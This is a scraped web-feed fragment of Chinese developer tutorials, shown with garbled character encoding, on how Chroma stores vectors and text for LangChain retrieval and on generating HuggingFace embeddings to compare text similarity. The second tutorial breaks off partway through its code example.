src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/217b639d05294495afc1e31f8b7df97c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=DPXUdRXSI2vuREl6GUQ2h3yTq4A%3D" alt="" loading="lazy"/></p>
<p>è¡¥å……ï¼šç”Ÿæˆçš„å‘é‡æ•°æ®ä¸­æœ‰ä¸€ä¸ª sqllite æ–‡ä»¶ï¼Œæˆ‘ä»¬æ¥ä½¿ç”¨ navicat æ‰“å¼€æŸ¥çœ‹ï¼Œå‘ç°åŒæ ·æ˜¯æœ‰ç±»ä¼¼äº mysql çš„è¡¨ç»“æ„çš„: <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d04e5b1993094b089fe724ec909ce8ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oSf5oCn55qE56iL5bqP5ZGY5bCP546L:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770491&amp;x-signature=H6RQ%2FIsW7bVgEiMryQ4t8TNBD04%3D" alt="" loading="lazy"/></p>
<ol start="0">
<li><code>chroma.sqlite3</code> æ˜¯ä»€ä¹ˆï¼Ÿ</li>
</ol>
<p>è¿™æ˜¯ <strong>Chroma å‘é‡æ•°æ®åº“ä½¿ç”¨çš„æœ¬åœ°å­˜å‚¨æ–‡ä»¶</strong>ï¼ŒåŸºäº <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.sqlite.org%2F" target="_blank" title="https://www.sqlite.org/" ref="nofollow noopener noreferrer">SQLite</a>ï¼ˆä¸€ç§è½»é‡çº§åµŒå…¥å¼å…³ç³»å‹æ•°æ®åº“ï¼‰ã€‚</p>
<p>å®ƒ<strong>ä¸ç›´æ¥å­˜å‚¨å‘é‡æœ¬èº«</strong>ï¼Œè€Œæ˜¯å­˜å‚¨ä»¥ä¸‹å†…å®¹ï¼š</p>

























<table><thead><tr><th>å­˜å‚¨å†…å®¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>âœ… <strong>æ–‡æ¡£åŸå§‹æ–‡æœ¬</strong>ï¼ˆ<code>documents</code>ï¼‰</td><td>ä½ ä¼ å…¥çš„ <code>Document.page_content</code></td></tr><tr><td>âœ… <strong>å…ƒæ•°æ®</strong>ï¼ˆ<code>metadatas</code>ï¼‰</td><td>å¦‚æ–‡ä»¶æ¥æºã€é¡µç ã€è‡ªå®šä¹‰æ ‡ç­¾ç­‰ï¼ˆ<code>Document.metadata</code>ï¼‰</td></tr><tr><td>âœ… <strong>å”¯ä¸€ ID</strong>ï¼ˆ<code>ids</code>ï¼‰</td><td>æ¯ä¸ª chunk çš„å”¯ä¸€æ ‡è¯†ç¬¦</td></tr><tr><td>âŒ <strong>å‘é‡ï¼ˆembeddingsï¼‰</strong></td><td><strong>ä¸åœ¨æ­¤æ–‡ä»¶ä¸­ï¼</strong> å‘é‡é»˜è®¤å­˜å‚¨åœ¨ <strong><code>index/</code> ç›®å½•ä¸‹çš„ HNSW ç´¢å¼•æ–‡ä»¶ä¸­</strong>ï¼ˆç”± <code>hnswlib</code> æˆ– <code>hnsw</code> å®ç°ï¼‰</td></tr></tbody></table>
<blockquote>
<p>ğŸ“ å…¸å‹çš„ Chroma æŒä¹…åŒ–ç›®å½•ç»“æ„ï¼š</p>
<pre><code class="hljs language-python" lang="python">./embeddings/
â”œâ”€â”€ chroma.sqlite3        â† æ–‡æ¡£å†…å®¹ + å…ƒæ•°æ® + ID
â””â”€â”€ index/                â† å‘é‡ç´¢å¼•æ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶ï¼Œä¸å¯è¯»ï¼‰
 â”œâ”€â”€ header.<span class="hljs-built_in">bin</span>
 â”œâ”€â”€ data.<span class="hljs-built_in">bin</span>
 â””â”€â”€ ...
</code></pre>
</blockquote>
<hr/>
<p>ä»€ä¹ˆæ˜¯â€œå‘é‡æ•°æ®â€ï¼Ÿ</p>
<p>â€œå‘é‡æ•°æ®â€æŒ‡çš„æ˜¯ <strong>å°†æ–‡æœ¬é€šè¿‡ Embedding æ¨¡å‹è½¬æ¢æˆçš„é«˜ç»´æ•°å€¼æ•°ç»„</strong>ï¼ˆæ¯”å¦‚ 1536 ç»´çš„æµ®ç‚¹æ•°åˆ—è¡¨ï¼‰ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">  æ–‡æœ¬: <span class="hljs-string">"Java æ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€"</span>
  â†“ ç»è¿‡ DashScope text-embedding-v2
  å‘é‡: [<span class="hljs-number">0.23</span>, <span class="hljs-number">-0.45</span>, <span class="hljs-number">0.89</span>, ..., <span class="hljs-number">0.01</span>]  # é•¿åº¦ <span class="hljs-number">1536</span>
</code></pre>
<p>Chroma å‘é‡æ•°æ®åº“å­˜å‚¨æœºåˆ¶è¯¦è§£</p>
<p>Chroma å¦‚ä½•å­˜å‚¨å‘é‡æ•°æ®ï¼Ÿ</p>
<p>Chroma é‡‡ç”¨ <strong>åˆ†ç¦»å­˜å‚¨ç­–ç•¥</strong>ï¼š</p>























<table><thead><tr><th>æ•°æ®ç±»å‹</th><th>å­˜å‚¨ä½ç½®</th><th>æ ¼å¼</th><th>æ˜¯å¦å¯è¯»</th></tr></thead><tbody><tr><td>åŸå§‹æ–‡æœ¬ &amp; å…ƒæ•°æ®</td><td><code>chroma.sqlite3</code></td><td>SQLite è¡¨</td><td>âœ… å¯ç”¨ DB æµè§ˆå™¨æ‰“å¼€</td></tr><tr><td>å‘é‡ï¼ˆembeddingsï¼‰</td><td><code>./index/</code> ç›®å½•</td><td>äºŒè¿›åˆ¶ HNSW ç´¢å¼•</td><td>âŒ ä¸å¯ç›´æ¥é˜…è¯»</td></tr></tbody></table>
<p>ğŸ” ä½ å¯ä»¥ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fsqlitebrowser.org%2F" target="_blank" title="https://sqlitebrowser.org/" ref="nofollow noopener noreferrer">DB Browser for SQLite</a> æ‰“å¼€ <code>chroma.sqlite3</code>ï¼ŒæŸ¥çœ‹ <code>embeddings</code> è¡¨ï¼ˆå®é™…å­˜çš„æ˜¯ ID å’Œæ–‡æ¡£ï¼Œ<strong>ä¸æ˜¯å‘é‡å€¼</strong>ï¼‰ï¼Œå‘é‡åªå­˜åœ¨äºç´¢å¼•ä¸­ã€‚</p>
<hr/>
<p>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</p>
<ul>
<li><strong>SQLite</strong>ï¼šè½»é‡ã€æ— éœ€æœåŠ¡å™¨ã€é€‚åˆæœ¬åœ°å¼€å‘ï¼Œå®Œç¾å­˜æ–‡æœ¬å’Œå…ƒæ•°æ®ã€‚</li>
<li><strong>HNSW ç´¢å¼•</strong>ï¼ˆåœ¨ <code>index/</code>ï¼‰ï¼šä¸“ä¸º<strong>é«˜æ•ˆè¿‘ä¼¼æœ€è¿‘é‚»æœç´¢ï¼ˆANNï¼‰</strong> è®¾è®¡ï¼Œèƒ½å¿«é€Ÿåœ¨ç™¾ä¸‡çº§å‘é‡ä¸­æ‰¾ç›¸ä¼¼é¡¹ã€‚</li>
</ul>
<p>âš¡ <strong>æ£€ç´¢æ—¶æµç¨‹</strong>ï¼š</p>
<ol start="0">
<li>ç”¨æˆ·è¾“å…¥é—®é¢˜ â†’ è½¬ä¸ºå‘é‡</li>
<li>åœ¨ <code>index/</code> çš„ HNSW ç´¢å¼•ä¸­æ‰¾æœ€ç›¸ä¼¼çš„ <strong>ID åˆ—è¡¨</strong></li>
<li>ç”¨è¿™äº› ID å» <code>chroma.sqlite3</code> æŸ¥å‡ºå¯¹åº”çš„ <strong>åŸå§‹æ–‡æœ¬å’Œå…ƒæ•°æ®</strong></li>
<li>è¿”å›ç»™ LLM ä½œä¸ºä¸Šä¸‹æ–‡</li>
</ol>
<hr/>
<p>éªŒè¯ï¼š</p>
<p>æŸ¥çœ‹ SQLite å†…å®¹</p>
<pre><code class="hljs language-bash" lang="bash">  <span class="hljs-comment"># å®‰è£… sqlite3 å‘½ä»¤è¡Œå·¥å…·ï¼ˆMac/Linux é€šå¸¸è‡ªå¸¦ï¼‰</span>
  sqlite3 ./embeddings/chroma.sqlite3
  .tables
  SELECT <span class="hljs-built_in">id</span>, document FROM embeddings LIMIT 1;
</code></pre>
<p>ç°åœ¨å°±å®Œæˆäº†å‘é‡æ•°æ®çš„å­˜å‚¨ï¼Œå…‰å­˜è¿›å»è¿˜ä¸å¤Ÿï¼Œå½“ llm éœ€è¦å›ç­”ç”¨æˆ·é—®é¢˜çš„æ—¶å€™ï¼Œè‚¯å®šä¸èƒ½æŠŠå…¨éƒ¨çš„å‘é‡æ•°æ®åŠ è½½ç„¶åç»™ llm ä½œä¸ºä¸Šä¸‹æ–‡å§ï¼Œé‚£æ ·å¤ªæµªè´¹ token äº†ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªæ£€ç´¢å™¨ï¼Œåªæå–å’Œç”¨æˆ·é—®é¢˜ç›¸å…³çš„ä¿¡æ¯ï¼Œç„¶åå°†è¿™ä¸€éƒ¨åˆ†çš„ä¿¡æ¯ä½œä¸ºä¸Šä¸‹æ–‡äº¤ç»™ llmã€‚</p>
<ul>
<li>
<p>æ£€ç´¢å™¨</p>
<p>ä¸€æ—¦æ•°æ®åœ¨æ•°æ®åº“ä¸­ï¼Œä½†ä»ç„¶éœ€è¦æ£€ç´¢å®ƒã€‚å‘é‡åº“ï¼ˆå¦‚ Chromaï¼‰åªæ˜¯å­˜å‚¨äº†æ–‡æ¡£çš„å‘é‡ï¼Œä½†è¦å›ç­”ç”¨æˆ·é—®é¢˜æˆ‘ä»¬éœ€è¦ä¸€ä¸ª æ£€ç´¢å™¨ï¼ˆRetrieverï¼‰ ç”¨æ¥</p>
<ul>
<li>æŠŠç”¨æˆ·é—®é¢˜ä¹Ÿè½¬æˆå‘é‡</li>
<li>åœ¨åº“ä¸­æ‰¾æœ€ç›¸ä¼¼çš„ top-k æ–‡æ¡£</li>
<li>æŠŠè¿™äº›æ–‡æ¡£ä½œä¸ºä¸Šä¸‹æ–‡å–‚ç»™ LLM æœ€åŸºç¡€çš„å°±æ˜¯ å‘é‡ç›¸ä¼¼åº¦æ£€ç´¢ï¼ˆå¦‚ä½™å¼¦ç›¸ä¼¼åº¦ï¼‰ï¼ŒLangChain ç”¨ vectorstore.as_retriever() ä¸€è¡Œå°±èƒ½å®ç°ã€‚</li>
</ul>
</li>
</ul>
<p>æˆ‘ä»¬åªéœ€è¦åœ¨ä¸Šé¢çš„å‘é‡å­˜å‚¨çš„ä»£ç ä¸­åŠ ä¸Š<strong>vectorstore.as_retriever()</strong></p>
<pre><code class="hljs language-ini" lang="ini">  <span class="hljs-attr">retriever</span> = vectorstore.as_retriever()
</code></pre>
<p>è¿˜å¯ä»¥æŒ‡å®šæ¯æ¬¡æ£€ç´¢è¿”å›æœ€ç›¸ä¼¼çš„å‰ k ä¸ªæ–‡æ¡£å—ï¼ˆchunksï¼‰ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">  <span class="hljs-attr">retriever</span> = vectorstore.as_retriever(search_kwargs={<span class="hljs-string">"k"</span>: <span class="hljs-number">5</span>})
</code></pre>
<p>åœ¨ RAGï¼ˆRetrieval-Augmented Generationï¼‰æµç¨‹ä¸­ï¼š æ£€ç´¢å™¨ï¼ˆRetrieverï¼‰ è´Ÿè´£â€œæ‰¾ç›¸å…³çŸ¥è¯†â€ LLM è´Ÿè´£â€œæ ¹æ®çŸ¥è¯†å›ç­”é—®é¢˜â€ LangChain é€šè¿‡ .as_retriever() ç»Ÿä¸€äº†å„ç§å‘é‡åº“çš„æ£€ç´¢æ¥å£ï¼Œè®©ä½ å¯ä»¥è½»æ¾åˆ‡æ¢ Chromaã€FAISSã€Pinecone ç­‰ï¼Œè€Œä¸ç”¨æ”¹åç»­ä»£ç ã€‚</p>
<p>æœ¬æœŸæ•™ç¨‹å°±å…ˆåˆ°è¿™é‡Œï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChainåµŒå…¥ï¼šä»åŸç†åˆ°å®è·µ]]></title>    <link>https://juejin.cn/post/7602463463106379822</link>    <guid>https://juejin.cn/post/7602463463106379822</guid>    <pubDate>2026-02-04T01:31:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602463463106379822" data-draft-id="7602512226998812722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChainåµŒå…¥ï¼šä»åŸç†åˆ°å®è·µ"/> <meta itemprop="keywords" content="LangChain"/> <meta itemprop="datePublished" content="2026-02-04T01:31:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‰å¸½lufei"/> <meta itemprop="url" content="https://juejin.cn/user/501033035632093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChainåµŒå…¥ï¼šä»åŸç†åˆ°å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501033035632093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‰å¸½lufei
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T01:31:18.000Z" title="Wed Feb 04 2026 01:31:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å¹´åº•äº†ï¼Œæœ‰å‡ ä¸ªé¡¹ç›®çš„å®¢æˆ·è¿˜åœ¨å‚¬ç€ä¸€äº›æ–°æçš„éœ€æ±‚åœ¨æ˜¥èŠ‚å‰ä¸Šçº¿</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bfca817a19fd4dbe946877c845ca013a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6I2J5bi9bHVmZWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770773478&amp;x-signature=8fSgNdcgvd22MUIlAyrXb2L3AUY%3D" alt="" loading="lazy"/></p>
<p>æœ‰å‡ å¤©æ²¡å­¦ä¹ LangChainæ¡†æ¶ç›¸å…³çŸ¥è¯†äº†ï¼ŒæŠ½ç©ºç»§ç»­å­¦ä¹ ç ”ç©¶</p>
<h2 data-id="heading-1">åµŒå…¥</h2>
<p>åµŒå…¥ï¼ˆEmbeddingï¼‰å¯ä»¥å°†æ–‡æœ¬è½¬æ¢ä¸ºå‘é‡è¡¨ç¤ºï¼Œä»è€Œå®ç°æ–‡æœ¬çš„è¯­ä¹‰åˆ†æå’Œç›¸ä¼¼åº¦è®¡ç®—</p>
<p>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ç»™æ¯ä¸ªæ–‡æœ¬åˆ†é…ä¸€ä¸ª"æ•°å­—èº«ä»½è¯"ï¼Œç›¸ä¼¼çš„æ–‡æœ¬ä¼šæœ‰ç›¸ä¼¼çš„"èº«ä»½è¯å·ç "</p>
<h2 data-id="heading-2">åº”ç”¨åœºæ™¯</h2>
<p>æ—¥å¸¸æˆ‘ä»¬æ¥è§¦åˆ°çš„å®é™…çš„åœºæ™¯åº”ç”¨ï¼Œæ¯”å¦‚ï¼š</p>
<ul>
<li>æ™ºèƒ½æœç´¢ï¼šæ¯”å¦‚åœ¨æ–‡æ¡£åº“ä¸­æŸ¥æ‰¾ä¸æŸ¥è¯¢è¯­ä¹‰ç›¸å…³çš„å†…å®¹ï¼Œè€Œä¸ä»…ä»…æ˜¯å…³é”®è¯åŒ¹é…</li>
<li>é—®ç­”ç³»ç»Ÿï¼šæ‰¾åˆ°ä¸ç”¨æˆ·é—®é¢˜æœ€ç›¸å…³çš„æ–‡æ¡£ç‰‡æ®µä½œä¸ºç­”æ¡ˆä¾æ®</li>
<li>æ¨èç³»ç»Ÿï¼šæ ¹æ®ç”¨æˆ·å…´è¶£å‘é‡æ¨èç›¸å…³å†…å®¹</li>
</ul>
<h2 data-id="heading-3">ä»£ç å®ç°</h2>
<p>ç¤ºä¾‹æä¾›äº†ä¸¤ä¸ªä¾‹å­ï¼Œä¸€ä¸ªæ˜¯æ–‡æœ¬å¯¹æ¯”ï¼Œä¸€ä¸ªæ˜¯æ–‡æœ¬æœç´¢</p>
<pre><code class="hljs language-python" lang="python">
<span class="hljs-keyword">from</span> langchain_huggingface <span class="hljs-keyword">import</span> HuggingFaceEmbeddings
<span class="hljs-keyword">from</span> sklearn.metrics.pairwise <span class="hljs-keyword">import</span> cosine_similarity
<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> os

<span class="hljs-comment"># ç¤ºä¾‹ 1: ä½¿ç”¨ HuggingFace åµŒå…¥æ¨¡å‹ï¼ˆæ— éœ€ API å¯†é’¥ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">use_huggingface_embeddings</span>():
    <span class="hljs-string">"""ä½¿ç”¨ HuggingFace æä¾›çš„é¢„è®­ç»ƒæ¨¡å‹ç”ŸæˆåµŒå…¥"""</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n=== ä½¿ç”¨ HuggingFace åµŒå…¥æ¨¡å‹ ==="</span>)
    
    <span class="hljs-comment"># åˆ›å»ºåµŒå…¥æ¨¡å‹å®ä¾‹</span>
    embeddings = HuggingFaceEmbeddings(model_name=<span class="hljs-string">"all-MiniLM-L6-v2"</span>)
    
    <span class="hljs-comment"># ç¤ºä¾‹æ–‡æœ¬</span>
    texts = [
        <span class="hljs-string">"çŒ«æ˜¯ä¸€ç§å¸¸è§çš„å®¶å…»å® ç‰©"</span>,
        <span class="hljs-string">"ç‹—æ˜¯äººç±»æœ€å¥½çš„æœ‹å‹"</span>,
        <span class="hljs-string">"å¤§è±¡æ˜¯é™†åœ°ä¸Šæœ€å¤§çš„åŠ¨ç‰©"</span>,
        <span class="hljs-string">"å®¶å…»å® ç‰©ä¸­çŒ«ç‰¹åˆ«æ™®é"</span>
    ]
    
    <span class="hljs-comment"># ç”ŸæˆåµŒå…¥å‘é‡</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç”Ÿæˆæ–‡æœ¬åµŒå…¥å‘é‡..."</span>)
    vectors = embeddings.embed_documents(texts)
    
    <span class="hljs-comment"># æŸ¥çœ‹åµŒå…¥å‘é‡çš„ç»´åº¦</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åµŒå…¥å‘é‡ç»´åº¦: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(vectors[<span class="hljs-number">0</span>])}</span>"</span>)
    
    <span class="hljs-comment"># è®¡ç®—æ–‡æœ¬ä¹‹é—´çš„ç›¸ä¼¼åº¦</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\nè®¡ç®—æ–‡æœ¬ä¹‹é—´çš„ç›¸ä¼¼åº¦:"</span>)
    similarity_matrix = cosine_similarity(vectors)
    
    <span class="hljs-keyword">for</span> i, text1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(texts):
        <span class="hljs-keyword">for</span> j, text2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(texts):
            <span class="hljs-keyword">if</span> i &lt; j:  <span class="hljs-comment"># é¿å…é‡å¤è®¡ç®—</span>
                similarity = similarity_matrix[i][j]
